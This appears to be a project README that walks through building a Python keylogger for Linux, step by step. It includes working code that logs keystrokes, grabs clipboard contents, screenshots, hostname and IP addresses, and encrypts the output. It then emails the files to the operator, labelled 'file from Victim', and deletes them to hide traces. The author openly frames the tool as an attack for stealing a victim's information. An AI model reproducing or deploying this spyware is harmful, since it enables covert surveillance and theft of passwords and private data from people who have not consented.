# Multifunctional Advanced Keylogger using Python

#
***Hii guys ![hello](https://github.com/LakshmiDeepak9653/resoures1/blob/main/wave.gif) !! Fancy to see here*** 
Welcome to my project.

First of all the Question is 
>_What is a keylogger??_
>
>_a computer program that records every keystroke made by a computer user, especially  in order to gain fraudulent access to passwords and other confidential information._

Now you are familiar with Keylogger definition.
Then,
Again a Question is
>_How to use it and more over,_
>_How to learn it??_

Before that What makes my Keylogger much advanced and multifuntional.
Let's find out by seeing Features of it.
#### Features
- ✔️ Trace the KeyStrokes.  
- ✔️ Write a file with info of Traced.
- ✔️ Also can trace the Clipboard info.
- ✔️ Grab a screenshot.
- ✔️ Trace the system info like processor type, OS version many more.
- ✔️ Encrypt the output files with help of Cryptography.
- ✔️ Send a mail to your email address with the file attachments.
- ✔️ Delete all the files and folder created after the attack.
- ✔️ Can run in Background.
-  ❌ Suitable to all Operating Systems (Only for linux).

As you can see my Feature rich one So, that's why I called it as ***Multifunctional Advanced Keylogger***.

Without any Delay. Let's get into topic.

First of all you need is ![Pycharm](https://img.shields.io/badge/IDE-PYCHARM-green)  you can find it [here](https://www.jetbrains.com/pycharm/download/#section=linux).

and then you want to download some [requirements](https://github.com/LakshmiDeepak9653/KeyLogger-using-Python/blob/main/requirements.txt).
navigate to project folder and there you will find requirements.txt. Open the terminal in that folder.
then `pip install -r requiremnts.txt`
these will download all the required packages for these project.

---


**Let's get into the main program**

Directly import all these packages. Don't worry I will explain all these one by one.
```python
#Importing Required Libaries
import pynput
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import os
from cryptography.fernet import Fernet
from requests import get
from PIL import ImageGrab
from datetime import datetime
import subprocess
```
Declare the files for info like for Keystrokes, Screenshot, Clipboard, Systeminfo with filepath and set count as 0 and Key to empty list.
```python
filepath = "//tmp//pythonkeylogger//"
#os.mkdir(filepath)
#Declaring Files
keys_information ="Key-log.txt"
system_information = "system-info.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information_e = "Key-log_E.txt"
system_information_e = "system_E.txt"
clipboard_information_e = "clipboard_E.txt"
Cryptokey = "KEY.txt"
count = 0
keys = []
```

Here goes code for getting Keystrokes info

```python
def on_press(key):
    global keys, count
    print(key," Pressed")
    keys.append(key)
    count += 1
    
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as Listener:
    print("Ready to trace 👣")
    Listener.join()
```
Then the Output goes like this
![img](https://github.com/LakshmiDeepak9653/resoures1/blob/main/Screenshot%20from%202022-01-22%2011-38-00.png)

as you see it traced and printed all the keys I pressed and we set esc key to exit. so It breaks the program.

Now we want to write the file with all info we gathered.
 uncomment these line `os.mkdir(filepath)` and type this code.
```python
def write_file(keys):
    with open(filepath + keys_information, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.close()
```

It creates a file with `Key-log.txt` with all the information we traced.

##### For the system info:-
```python
def computer_information():
    with open(filepath + system_information, 'a') as f:
        hostname = socket.gethostname()
        ipaddr = socket.gethostbyaddr(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address : " + public_ip + '\n')
        except Exception:
            f.write("couldnt get public ip  address")
        f.write("processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP address: " + str(ipaddr) + '\n')


computer_information()
```

##### for the Clipboard info:-
```python
def getClipboardData():
    p = subprocess.Popen(['xclip', '-selection', 'clipboard', '-o'], stdout=subprocess.PIPE)
    retcode = p.wait()
    data = p.stdout.read()
    with open(filepath + clipboard_information, 'a') as f:
        k = str(data)
        f.write(k)
    return data
getclipboardData()
```

##### For Screenshot info:-
```python
def screenshot():
    im = ImageGrab.grab()
    im.save(filepath + screenshot_information)
screenshot()
```

Here we want to clear the all the files we created that stored in `/tmp` folder because we have to clear traces. 
For now do it manually go to `/tmp/pythonkeylogger/` delete this folder.

Otherwise it show error like this:-
![img](https://github.com/LakshmiDeepak9653/resoures1/blob/main/Screenshot%20from%202022-01-22%2011-57-39.png)

>But how can we do these in our program ??
>
>With the help of OS pacakage.

Now we want clear the files and folder we created after the tracing and before the exit of program. So, we have to do these in `on_release` function.

code goes like these.
```python
def on_release(key):
    if key == Key.esc:
        os.remove(filepath + keys_information)
        os.remove(filepath + system_information)
        os.remove(filepath + clipboard_information)
        os.remove(filepath + screenshot_information)
        os.rmdir(filepath)
        return False
```

## Lets combine all the code here
```python
#Importing Required Libaries
import pynput
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import os
from cryptography.fernet import Fernet
from requests import get
from PIL import ImageGrab
from datetime import datetime
import subprocess

#Declaring Files
keys_information ="Key-log.txt"
system_information = "system-info.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"

filepath = "//tmp//pythonkeylogger//"
os.mkdir(filepath)

count = 0
keys = []


def on_press(key):
    global keys, count, now
    print(key," Pressed")
    now = datetime.now()
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(filepath + keys_information, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write("\t\t:")
            f.write(str(now))
            f.write("\n")
            f.close()
def computer_information():
    with open(filepath + system_information, 'a') as f:
        hostname = socket.gethostname()
        ipaddr = socket.gethostbyaddr(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address : " + public_ip + '\n')
        except Exception:
            f.write("couldnt get public ip  address")
        f.write("processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP address: " + str(ipaddr) + '\n')


computer_information()


def getClipboardData():
    p = subprocess.Popen(['xclip', '-selection', 'clipboard', '-o'], stdout=subprocess.PIPE)
    retcode = p.wait()
    data = p.stdout.read()
    with open(filepath + clipboard_information, 'a') as f:
        k = str(data)
        f.write(k)
    return data
getClipboardData()

def screenshot():
    im = ImageGrab.grab()
    im.save(filepath + screenshot_information)
screenshot()

def on_release(key):
    if key == Key.esc:
        os.remove(filepath + keys_information)
        os.remove(filepath + system_information)
        os.remove(filepath + clipboard_information)
        os.remove(filepath + screenshot_information)
        os.rmdir(filepath)
        return False
with Listener(on_press=on_press, on_release=on_release) as Listener:
    print("Ready to trace 👣")
    Listener.join()
```

##### Encryption of files 
 if the victim finds what happening in their pc. we will not expose our info to him with help of Cyrptography
 
 ```python
 key = Fernet.generate_key()
fernet = Fernet(key)
with open(filepath + Cryptokey, 'wb') as f:
    f.write(key)


def encryptfile(information_file, encrypted_file):
    information_file = information_file
    encrypted_file = encrypted_file
    with open(filepath + information_file, 'rb') as f:
        original = f.read()
    encrypted = fernet.encrypt(original)
    with open(filepath + encrypted_file, 'wb') as f:
        f.write(encrypted)
 ```
 Again we want to edit `on_release` function

```python
def on_release(key):
    if key == Key.esc:
        encryptfile(keys_information,keys_information_e)
        encryptfile(system_information,system_information_e)
        encryptfile(clipboard_information,clipboard_information_e)
        os.remove(filepath + keys_information)
        os.remove(filepath + system_information)
        os.remove(filepath + clipboard_information)
        os.remove(filepath + keys_information_e)
        os.remove(filepath + system_information_e)
        os.remove(filepath + clipboard_information_e)
        os.remove(filepath + screenshot_information)
        os.remove(filepath + Cryptokey)
        os.rmdir(filepath)
        return False
```


 Last encrypt the file and delete in victim machine.
 
 But the Again The Question is
 >How we get that info ??
 >
 > By mailing the files to our email
 
 ##### Here code for that:-
```python
def email(filename, attachement, toaddr,body):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "LogFiles"

    b = "  file from Victim"
    body=body+b
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachement = open(attachement, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachement).read())
    encoders.encode_base64(p)
    p.add_header("Content-Disposition", "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP("smtp.gmail.com", 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()
    print("Send mail 📨")
```

# Final Code
---
## Lies in the [KeyLogger](https://github.com/LakshmiDeepak9653/KeyLogger-using-Python/blob/main/Keylogger.py) here..
---

## Bug / Feature Request :man_technologist:

If you find a bug (the application couldn't handle the error or gave undesired results), Kindly tell me through the links given below in **Connect with me**

It is my first Project .Thank you !.



## Connect with me! 🌐
[![WhatsApp](https://img.icons8.com/bubbles/100/000000/whatsapp.png)](https://wa.me/+919491184607)
[![LinkedIn](https://img.icons8.com/bubbles/100/000000/linkedin.png)](https://www.linkedin.com/in/lakshmi-deeapk-karumuri-402460207)
[![GitHub](https://img.icons8.com/bubbles/100/000000/github.png)](https://github.com/LakshmiDeepak9653)
[![Instagram](https://img.icons8.com/bubbles/100/000000/instagram-new.png)](https://www.instagram.com/deepakvevo/)
[![FaceBook](https://img.icons8.com/bubbles/100/000000/facebook.png)](https://www.facebook.com/deepak.karumuri.3)
[![Twitter](https://img.icons8.com/bubbles/100/000000/twitter.png)](https://twitter.com/deepak_karumuri)
